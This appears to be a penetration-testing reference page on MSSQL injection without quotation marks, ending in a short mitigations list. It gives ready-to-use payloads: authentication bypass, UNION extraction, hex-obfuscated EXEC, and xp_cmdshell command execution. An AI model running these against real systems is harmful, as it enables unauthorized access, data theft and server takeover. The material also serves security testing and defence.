---
title: Avoiding Quotations
description: Techniques to avoid using quotes in MSSQL injection
category: Injection Techniques
order: 8
tags: ["bypass", "quotation", "filter evasion"]
lastUpdated: 2026-10-08
---

Web applications often implement security filters that block or escape quotation marks (`'` or `"`) to prevent SQL injection. These techniques allow you to construct string literals without using quotes in Microsoft SQL Server. They matter most in a numeric injection point (`WHERE id = <input>`), where no quote is needed to break out of the query and escaping quotes does not stop the injection.

## Using CHAR() Function

The `CHAR()` function returns a character based on its ASCII value, allowing you to build strings character by character:

```sql
-- 'admin' without quotes
SELECT CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)
```

## Using String Concatenation with Variables

Declaring variables to hold characters and concatenating them:

```sql
DECLARE @a nvarchar(100)
SET @a = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)
-- @a now contains 'admin'
```

## Using Hexadecimal Notation

A hexadecimal literal is a `varbinary` value. Cast it to `varchar` to use it as a string; compared directly with an `nvarchar` column it is read as UTF-16 bytes and does not match:

```sql
-- 'admin' in hex
SELECT CAST(0x61646D696E AS varchar(10))

-- N'admin': UTF-16LE bytes cast to nvarchar
SELECT CAST(0x610064006D0069006E00 AS nvarchar(10))
```

## Using Unicode Notation

For Unicode strings, `NCHAR()` returns the character for a Unicode code point:

```sql
-- N'admin' (Unicode string)
SELECT NCHAR(97) + NCHAR(100) + NCHAR(109) + NCHAR(105) + NCHAR(110)
```

## Using ASCII Values in Computed Columns

When you need to compare strings without quotes:

```sql
-- Instead of: WHERE username = 'admin'
SELECT * FROM users WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)
```

## Using Built-in Functions to Generate Strings

Some built-in functions return predictable strings:

```sql
-- Instead of 'master'
SELECT DB_NAME(1)

-- Instead of 'dbo'
SELECT SCHEMA_NAME(1)

-- Instead of 'guest'
SELECT USER_NAME(2)
```

## Using Subqueries to Get Known Strings

Get literal strings from system tables:

```sql
-- Get a specific string without quotes
SELECT name FROM sys.databases WHERE database_id = 1
-- Returns 'master'
```

## Practical SQL Injection Examples

### Authentication Bypass

```sql
-- Original query with quotes:
-- SELECT * FROM users WHERE username='admin' AND password='password'

-- Numeric context (WHERE id = <input>), no quote anywhere:
0 OR username=CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)--
```

### Data Extraction with UNION

```sql
-- Original UNION with quotes:
-- UNION SELECT 'sensitive_data', NULL, NULL

-- Using hex (numeric context, 3 columns, the second one a string):
-1 UNION SELECT NULL, CAST(0x73656E7369746976655F64617461 AS varchar(50)), NULL--
```

### System Command Execution

`EXEC` does not accept expressions as parameters (`EXEC xp_cmdshell CHAR(100)+...` is a syntax error), so build the command in a variable first (declaring and assigning in one `DECLARE` needs SQL Server 2008+). Stacked query, numeric context; `xp_cmdshell` needs sysadmin and must be enabled:

```sql
-- Original command with quotes:
-- EXEC xp_cmdshell 'dir C:\'

-- 'dir C:\' built with CHAR() in a variable:
1; DECLARE @c varchar(20) = CHAR(100)+CHAR(105)+CHAR(114)+CHAR(32)+CHAR(67)+CHAR(58)+CHAR(92); EXEC master..xp_cmdshell @c--
```

## Combining Techniques

For complex scenarios, combine multiple techniques:

```sql
-- Procedure name and parameter both in variables
DECLARE @c nvarchar(100), @p nvarchar(100)
SELECT @c = CHAR(120) + CHAR(112) + CHAR(95) + CHAR(99) + CHAR(109) + CHAR(100) + CHAR(115) + CHAR(104) + CHAR(101) + CHAR(108) + CHAR(108)
SELECT @p = CHAR(100) + CHAR(105) + CHAR(114)
EXEC @c @p
-- Executes: EXEC xp_cmdshell 'dir'

-- Any statement, hex-encoded and run with EXEC()
DECLARE @q varchar(8000)
SELECT @q = 0x53454C45435420404076657273696F6E
EXEC(@q)
-- Executes: SELECT @@version
```

## Using T-SQL String Functions

Other T-SQL functions can help construct strings:

```sql
-- Using REPLICATE
SELECT REPLICATE(CHAR(97), 5)  -- Returns 'aaaaa'

-- Using STUFF
DECLARE @s varchar(10)
SET @s = CHAR(120) + CHAR(120) + CHAR(120)  -- 'xxx'
SELECT STUFF(@s, 2, 1, CHAR(121))  -- Returns 'xyx'
```

## Considerations and Limitations

1. **Performance Impact**: String building with CHAR() can be verbose and may hit query length limits
2. **Character Encoding**: Be aware of character encoding differences, especially with Unicode
3. **SQL Server Version**: Some techniques may behave differently across versions
4. **Column Data Types**: Ensure the generated strings match expected data types
5. **Query Length Limits**: Very long character concatenations may exceed query limits

## Mitigations

To defend against these techniques:

1. Use parameterized queries instead of building SQL strings
2. Apply input validation with whitelisting approaches
3. Implement WAFs that detect hex encoding and CHAR() function usage
4. Limit database user permissions to minimum required
5. Maintain updated database and security patches
